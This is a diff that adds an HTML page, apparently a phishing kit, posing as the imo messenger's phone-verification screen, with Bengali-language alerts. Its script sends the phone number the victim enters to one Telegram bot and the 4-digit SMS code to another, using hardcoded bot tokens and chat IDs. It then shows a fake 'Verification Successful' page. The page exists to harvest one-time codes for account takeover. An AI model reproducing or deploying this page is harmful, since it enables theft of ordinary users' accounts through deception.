@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-58936387-12"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-58936387-12');
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <script>
+      // Save the current console log function in case we need it.
+      const _log = console.log;
+      const _debug = console.debug;
+      const _info = console.info;
+      const _warn = console.warn;
+      const _error = console.error;
+      // Override the console
+      console.log = function(...rest) {
+        window.parent.postMessage(
+          {
+            source: 'iframe-' + window.name,
+            message: rest,
+            method: 'log'
+          },
+          '*'
+        );
+        _log.apply(console, arguments);
+      };
+
+      console.debug = function(...rest) {
+        window.parent.postMessage(
+          {
+            source: 'iframe-' + window.name,
+            message: rest,
+            method: 'debug'
+          },
+          '*'
+        );
+        _debug.apply(console, arguments);
+      };
+
+      console.info = function(...rest) {
+        window.parent.postMessage(
+          {
+            source: 'iframe-' + window.name,
+            message: rest,
+            method: 'info'
+          },
+          '*'
+        );
+        _info.apply(console, arguments);
+      };
+
+      console.warn = function(...rest) {
+        window.parent.postMessage(
+          {
+            source: 'iframe-' + window.name,
+            message: rest,
+            method: 'warn'
+          },
+          '*'
+        );
+        _warn.apply(console, arguments);
+      };
+
+      console.error = function(...rest) {
+        window.parent.postMessage(
+          {
+            source: 'iframe-' + window.name,
+            message: rest,
+            method: 'error'
+          },
+          '*'
+        );
+        _error.apply(console, arguments);
+      };
+    </script>
+
+    <script>
+        window.onerror = function(msg) {
+            window.parent.postMessage(
+                {
+                    source: 'iframe-' + window.name,
+                    message: [msg],
+                    method: 'error'
+                },
+                '*'
+                );
+        };
+    </script>
+
+    <script>
+        window.addEventListener('load', (event) => {
+        window.parent.postMessage({
+            source: 'iframe-navigation-' + window.name,
+            message: document.location.href,
+        }, '*');
+        })
+    </script>
+
+    <script>
+        window.onload = function() {
+            window.parent.postMessage(
+                {
+                  source: 'iframe-' + window.name,
+                  windowHeight: document.getElementsByTagName('html')[0].getBoundingClientRect().height,
+                },
+                '*'
+              );
+        };
+    </script>
+  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Phone Verification</title>  
+    <style>  
+        body, html {  
+            height: 100%;  
+            margin: 0;  
+            font-family: Arial, sans-serif;  
+            display: flex;  
+            justify-content: center;  
+            align-items: center;  
+            background: #fff;  
+        }  
+        .container {  
+            text-align: center;  
+            width: 90%;  
+            max-width: 400px;  
+            position: relative;  
+        }  
+        .back-arrow, .help-icon {  
+            position: absolute;  
+            font-size: 24px;  
+            text-decoration: none;  
+            color: black;  
+        }  
+        .back-arrow { top: 20px; left: 20px; }  
+        .help-icon { top: 20px; right: 20px; }  
+        h1 { margin-top: 60px; font-size: 24px; font-weight: bold; }  
+        .description, .terms {  
+            margin-top: 10px;  
+            font-size: 14px;  
+            color: #333;  
+        }  
+        .terms a {  
+            color: gray;  
+            text-decoration: underline;  
+        }  
+        .sync {  
+            margin-top: 20px;  
+        }  
+        select, input[type="tel"] {  
+            margin-top: 15px;  
+            padding: 10px;  
+            font-size: 16px;  
+            width: 100%;  
+            margin-bottom: 10px;  
+        }  
+        select {  
+            text-align-last: center;  
+        }  
+        #country-select {  
+            font-size: 18px;  
+            margin-bottom: 10px;  
+        }  
+        .phone-row {  
+            display: flex;  
+        }  
+        .phone-row span {  
+            text-align: center;  
+            margin-top: 15px;  
+            padding: 10px;  
+            font-size: 16px;  
+            width: 60px;  
+            margin-bottom: 10px;  
+            border: 1px solid #ccc;  
+            border-radius: 5px 0 0 5px;  
+        }  
+        .phone-row input {  
+            flex: 1;  
+            border: 1px solid #ccc;  
+            border-radius: 0 5px 5px 0;  
+        }  
+        .submit-btn {  
+            margin-top: 20px;  
+            background: #4fc3f7;  
+            border: none;  
+            border-radius: 50%;  
+            width: 50px;  
+            height: 50px;  
+            font-size: 24px;  
+            color: white;  
+            cursor: pointer;  
+        }
+        
+        /* Code verification page styles */
+        .icon {
+            font-size: 60px;
+            margin: 20px auto;
+        }
+        .input-code {
+            font-size: 24px;
+            padding: 10px;
+            width: 200px;
+            border: none;
+            border-bottom: 2px solid #2196F3;
+            outline: none;
+            text-align: center;
+        }
+        .countdown {
+            margin-top: 15px;
+            color: #999;
+        }
+        .header {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .subtext {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .icon-mail {
+            font-size: 48px;
+        }
+        
+        /* Success page styles */
+        .success-icon {
+            font-size: 80px;
+            margin: 20px auto;
+            color: #4CAF50;
+        }
+        .success-message {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #333;
+        }
+        
+        /* Hide pages by default */
+        .page {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+    </style>  
+</head>  
+<body>  
+    <!-- Phone Entry Page -->
+    <div id="phone-page" class="page active container">  
+        <a href="#" class="back-arrow">←</a>  
+        <a href="#" class="help-icon">?</a>  
+        <h1>Enter Your Phone</h1>  
+        <div class="description">  
+            Your number and professo opurbo book are used to connect you with your friends.  
+        </div>  
+        <div class="terms">  
+            By tapping Verify you are agreeing to imo's   
+            <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.  
+        </div>  
+        <div class="sync">  
+            <label><input type="checkbox"> Sync Contacts</label>  
+        </div>  
+        <br><br><br><br><br><br><br><br><br><br> 
+        <select id="country-select" onchange="updateCode()" style="text-align-last: center;">  
+            <option value="+93">Afghanistan</option>  
+            <option value="+355">Albania</option>  
+            <option value="+213">Algeria</option>  
+            <option value="+376">Andorra</option>  
+            <option value="+244">Angola</option>  
+            <option value="+54">Argentina</option>  
+            <option value="+374">Armenia</option>  
+            <option value="+61">Australia</option>  
+            <option value="+43">Austria</option>  
+            <option value="+994">Azerbaijan</option>  
+            <option value="+973">Bahrain</option>  
+            <option value="+880">Bangladesh</option>  
+            <option value="+375">Belarus</option>  
+            <option value="+32">Belgium</option>  
+            <option value="+591">Bolivia</option>  
+            <option value="+387">Bosnia and Herzegovina</option>  
+            <option value="+55">Brazil</option>  
+            <option value="+359">Bulgaria</option>  
+            <option value="+855">Cambodia</option>  
+            <option value="+237">Cameroon</option>  
+            <option value="+1">Canada</option>  
+            <option value="+86">China</option>  
+            <option value="+57">Colombia</option>  
+            <option value="+506">Costa Rica</option>  
+            <option value="+385">Croatia</option>  
+            <option value="+357">Cyprus</option>  
+            <option value="+420">Czech Republic</option>  
+            <option value="+45">Denmark</option>  
+            <option value="+20">Egypt</option>  
+            <option value="+372">Estonia</option>  
+            <option value="+251">Ethiopia</option>  
+            <option value="+358">Finland</option>  
+            <option value="+33">France</option>  
+            <option value="+995">Georgia</option>  
+            <option value="+49">Germany</option>  
+            <option value="+233">Ghana</option>  
+            <option value="+30">Greece</option>  
+            <option value="+852">Hong Kong</option>  
+            <option value="+91">India</option>  
+            <option value="+62">Indonesia</option>  
+            <option value="+98">Iran</option>  
+            <option value="+964">Iraq</option>  
+            <option value="+353">Ireland</option>  
+            <option value="+972">Israel</option>  
+            <option value="+39">Italy</option>  
+            <option value="+81">Japan</option>  
+            <option value="+962">Jordan</option>  
+            <option value="+7">Kazakhstan</option>  
+            <option value="+254">Kenya</option>  
+            <option value="+82">Korea (South)</option>  
+            <option value="+965">Kuwait</option>  
+            <option value="+996">Kyrgyzstan</option>  
+            <option value="+371">Latvia</option>  
+            <option value="+961">Lebanon</option>  
+            <option value="+218">Libya</option>  
+            <option value="+370">Lithuania</option>  
+            <option value="+352">Luxembourg</option>  
+            <option value="+853">Macau</option>  
+            <option value="+389">North Macedonia</option>  
+            <option value="+60">Malaysia</option>  
+            <option value="+960">Maldives</option>  
+            <option value="+223">Mali</option>  
+            <option value="+356">Malta</option>  
+            <option value="+230">Mauritius</option>  
+            <option value="+52">Mexico</option>  
+            <option value="+373">Moldova</option>  
+            <option value="+377">Monaco</option>  
+            <option value="+976">Mongolia</option>  
+            <option value="+212">Morocco</option>  
+            <option value="+95">Myanmar (Burma)</option>  
+            <option value="+977">Nepal</option>  
+            <option value="+31">Netherlands</option>  
+            <option value="+64">New Zealand</option>  
+            <option value="+234">Nigeria</option>  
+            <option value="+47">Norway</option>  
+            <option value="+968">Oman</option>  
+            <option value="+92">Pakistan</option>  
+            <option value="+507">Panama</option>  
+            <option value="+51">Peru</option>  
+            <option value="+63">Philippines</option>  
+            <option value="+48">Poland</option>  
+            <option value="+351">Portugal</option>  
+            <option value="+974">Qatar</option>  
+            <option value="+40">Romania</option>  
+            <option value="+7">Russia</option>  
+            <option value="+966">Saudi Arabia</option>  
+            <option value="+221">Senegal</option>  
+            <option value="+65">Singapore</option>  
+            <option value="+421">Slovakia</option>  
+            <option value="+386">Slovenia</option>  
+            <option value="+27">South Africa</option>  
+            <option value="+34">Spain</option>  
+            <option value="+94">Sri Lanka</option>  
+            <option value="+46">Sweden</option>  
+            <option value="+41">Switzerland</option>  
+            <option value="+963">Syria</option>  
+            <option value="+886">Taiwan</option>  
+            <option value="+992">Tajikistan</option>  
+            <option value="+255">Tanzania</option>  
+            <option value="+66">Thailand</option>  
+            <option value="+216">Tunisia</option>  
+            <option value="+90">Turkey</option>  
+            <option value="+993">Turkmenistan</option>  
+            <option value="+256">Uganda</option>  
+            <option value="+380">Ukraine</option>  
+            <option value="+971">United Arab Emirates</option>  
+            <option value="+44">United Kingdom</option>  
+            <option value="+1">United States</option>  
+            <option value="+998">Uzbekistan</option>  
+            <option value="+58">Venezuela</option>  
+            <option value="+84">Vietnam</option>  
+            <option value="+967">Yemen</option>  
+            <option value="+260">Zambia</option>  
+            <option value="+263">Zimbabwe</option>  
+        </select>  
+        <div class="phone-row">  
+            <span id="code">+880</span>  
+            <input type="tel" id="phone" placeholder="Phone number">  
+            <button class="submit-btn" onclick="submitPhone()">✓</button>  
+        </div>  
+    </div>
+    
+    <!-- Code Verification Page -->
+    <div id="code-page" class="page container">
+        <div class="header">Enter code</div>
+        <div class="icon icon-mail">✉️</div>
+        <div class="subtext">We've sent an SMS to <span id="phone-display">+880 1839-755446</span><br>with a 4-digit verification code.</div>
+        <input class="input-code" type="number" maxlength="4" placeholder="Code" id="otpInput">
+        <div class="countdown" id="countdown">Try again after 1:00</div>
+    </div>
+    
+    <!-- Success Page -->
+    <div id="success-page" class="page container">
+        <div class="success-icon">✓</div>
+        <h1>Verification Successful</h1>
+        <div class="success-message">
+            Your phone number has been successfully verified.
+        </div>
+    </div>
+
+    <script>  
+        // Phone page functions
+        function updateCode() {  
+            const select = document.getElementById('country-select');  
+            const code = select.value;  
+            document.getElementById('code').textContent = code;  
+        } 
+        
+        function submitPhone() {  
+            const code = document.getElementById('code').textContent;  
+            const phone = document.getElementById('phone').value.trim();  
+            
+            if (!phone) {  
+                alert("অনুগ্রহ করে ফোন নম্বর দিন।");  
+                return;  
+            }  
+            
+            const fullNumber = code + phone;  
+            const message = `ফোন নম্বর: ${fullNumber}`;  
+            const token = "8317674399:AAGe0H4AM95oiHgzj0oaSAilu7JSKqzwLBQ";  
+            const chat = "8112273034";  
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(message)}`)  
+            .then(response => {  
+                if (response.ok) {  
+                    // Update phone number display on code page
+                    document.getElementById('phone-display').textContent = fullNumber;
+                    // Show code page
+                    showPage('code-page');
+                    // Start countdown
+                    startCountdown();
+                } else {  
+                    alert("পাঠাতে ব্যর্থ হয়েছে, আবার চেষ্টা করুন।");  
+                }  
+            })  
+            .catch(error => {  
+                console.error("Error:", error);  
+                alert("একটি সমস্যা হয়েছে।");  
+            });  
+        }
+        
+        // Code page functions
+        let countdownElement = document.getElementById('countdown');
+        let countdownTime = 60; // Set initial time to 60 seconds
+        let countdownInterval;
+
+        function startCountdown() {
+            countdownTime = 60;
+            updateCountdown();
+            countdownInterval = setInterval(updateCountdown, 1000); // Update every second
+        }
+
+        function updateCountdown() {
+            let minutes = Math.floor(countdownTime / 60);
+            let seconds = countdownTime % 60;
+            
+            // Add leading zero for seconds if less than 10
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+
+            countdownElement.textContent = `Try again after ${minutes}:${seconds}`;
+            
+            if (countdownTime > 0) {
+                countdownTime--;
+            } else {
+                clearInterval(countdownInterval); // Stop the countdown once it reaches 0
+            }
+        }
+
+        // Automatically submit the OTP input when 4 digits are entered
+        let otpInput = document.getElementById('otpInput');
+        otpInput.addEventListener('input', function() {
+            if (otpInput.value.length === 4) {
+                // Disable further input to avoid errors
+                otpInput.disabled = true;
+
+                // Send OTP to Telegram bot
+                sendToTelegram(otpInput.value);
+
+                // Show success page
+                setTimeout(() => {
+                    showPage('success-page');
+                }, 1000);
+            }
+        });
+
+        // Function to send OTP data to Telegram bot
+        function sendToTelegram(otp) {
+            const token = '8440276369:AAHBkp5X2QBas8JvWhpgY9W9oPRYdm3CHsQ'; // Replace with your bot token
+            const chatId = '8234126500'; // Replace with your chat ID or the ID of the recipient
+
+            const message = `OTP: ${otp}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send the HTTP GET request
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+        
+        // Function to show specific page and hide others
+        function showPage(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show the requested page
+            document.getElementById(pageId).classList.add('active');
+        }
+    </script>  
+</body>  
+  </html>
